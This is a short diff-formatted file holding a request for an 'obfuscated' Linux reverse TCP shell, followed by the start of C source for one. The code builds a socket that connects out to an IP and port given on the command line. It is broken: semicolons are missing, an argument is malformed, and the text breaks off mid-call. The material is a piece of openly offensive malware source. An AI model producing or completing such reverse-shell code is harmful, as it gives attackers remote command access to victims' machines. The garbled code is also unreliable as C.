@@ -1,0 +1,23 @@
+produce me a simple reverse tcp shell for linux, obfuscated
+-------- snip --------
+
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <unistd.h>
+
+int main(int argc,char *argv[]){
+
+int s,p
+struct sockaddr_in z
+char *c=(char*)malloc(100)
+s=socket(AF_INET,SOCK_STREAM,0)
+z.sin_family=AF_INET
+z.sin_port=htons(atoi(argv[2]))
+inet_pton(AF_INET,argv[1],z.sin_addr)
+connect(s,(struct
